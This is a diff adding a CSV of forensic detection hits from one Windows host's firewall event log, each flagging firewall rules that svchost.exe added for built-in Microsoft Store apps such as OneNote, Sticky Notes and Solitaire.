@@ -1,0 +1,4597 @@
+timestamp,detections,path,count,Event.System.Provider,Event ID,Record ID,Computer,Event Data,
+2024-01-29T16:58:13.795526+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,300,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Pay
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{2B7BDCC2-FF03-40AD-9724-21723BF9DA51}'
+RuleName: Microsoft Pay
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:13.796301+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,301,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Pay
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{FD847F98-35D0-40C9-84DE-AF645DA159F4}'
+RuleName: Microsoft Pay
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:15.520068+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,310,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_11811.1001.18.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{EECBC032-F0AA-463D-9015-566A9E346C17}'
+RuleName: '@{Microsoft.StorePurchaseApp_11811.1001.18.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:15.521085+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,311,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.StorePurchaseApp_11811.1001.18.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{5E9E8295-1F59-4378-8CA3-5EB4804C7DB4}'
+RuleName: '@{Microsoft.StorePurchaseApp_11811.1001.18.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.StorePurchaseApp/Resources/DisplayTitle}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:18.467270+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,316,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.People_10.1902.633.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F95092B7-4F31-4435-B41D-932025017E80}'
+RuleName: '@{Microsoft.People_10.1902.633.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:18.468272+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,317,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.People_10.1902.633.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{691588B9-06AF-447A-A84F-51BE445BCFDC}'
+RuleName: '@{Microsoft.People_10.1902.633.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.People/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:19.289200+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,320,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: OneNote
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{AC127039-3189-4A8F-9CE5-2186F9640239}'
+RuleName: OneNote
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:19.289831+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,321,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{6B5D417E-0D3C-4E4E-9F32-D2F8A90EA953}'
+RuleName: OneNote
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:19.290359+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,322,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: OneNote
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{7CD0F31F-621A-41F1-9557-09D6815165E9}'
+RuleName: OneNote
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-01-29T16:58:19.292430+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,323,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{757BBBC8-72FA-4EA9-8440-87876B6C97B5}'
+RuleName: OneNote
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-01-29T16:58:19.293365+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,324,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{0A2B9799-64FF-4F01-B339-FAA516BE9633}'
+RuleName: OneNote
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:19.294267+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,325,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{A6F9A18B-EA58-413E-9897-095F771BD25A}'
+RuleName: OneNote
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:19.294906+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,326,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: OneNote
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{8EB65785-E59A-4846-9994-887363BB30A1}'
+RuleName: OneNote
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:20.536204+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,329,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MSPaint/resources/AppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{567803B3-21E9-4D30-99B0-040E24E54E23}'
+RuleName: '@{Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MSPaint/resources/AppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:20.537071+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,330,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MSPaint/resources/AppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{1353B152-7B5F-4797-AC05-0721609423CE}'
+RuleName: '@{Microsoft.MSPaint_6.1907.29027.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MSPaint/resources/AppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:21.247129+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,333,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MixedReality.Portal_2000.19081.1301.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{BE825694-56EB-47DA-86AA-D7BBE705DA99}'
+RuleName: '@{Microsoft.MixedReality.Portal_2000.19081.1301.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:21.248077+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,334,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MixedReality.Portal_2000.19081.1301.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F988B4DB-EA22-49C2-99DC-5F8B5C985B7D}'
+RuleName: '@{Microsoft.MixedReality.Portal_2000.19081.1301.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:22.554824+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,337,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Sticky Notes
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{10864AAE-06FF-4F84-A6F8-306D0BF9F202}'
+RuleName: Microsoft Sticky Notes
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:22.555338+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,338,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Sticky Notes
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{4B5249C1-6665-4EC8-8F27-9BA74AD34325}'
+RuleName: Microsoft Sticky Notes
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:22.557263+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,339,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Sticky Notes
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{EDA6D9E0-2B92-4382-9352-88F6CE252EA0}'
+RuleName: Microsoft Sticky Notes
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-01-29T16:58:22.558388+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,340,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Sticky Notes
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{341E1E7B-A331-4485-BFA2-71C7887938C3}'
+RuleName: Microsoft Sticky Notes
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-01-29T16:58:22.559661+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,341,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Sticky Notes
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{39A90A9D-9C7A-49DE-AF0B-0FD851887808}'
+RuleName: Microsoft Sticky Notes
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:22.561092+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,342,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Sticky Notes
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{026BA07F-FFCB-4283-A50D-E136DBE3C31D}'
+RuleName: Microsoft Sticky Notes
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-29T16:58:22.562281+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,343,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Sticky Notes
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F17E9A6B-91D5-4A42-B5E4-834E8F739B8E}'
+RuleName: Microsoft Sticky Notes
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:14.121042+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,348,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Solitaire Collection
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{38CB7467-CE24-4E77-9D94-01A81406F268}'
+RuleName: Microsoft Solitaire Collection
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-01-30T07:41:14.121769+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,349,DESKTOP-BNDE3TU,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft Solitaire Collection
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{A9456606-9417-49BF-9932-52BD706259AE}'
+RuleName: Microsoft Solitaire Collection
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
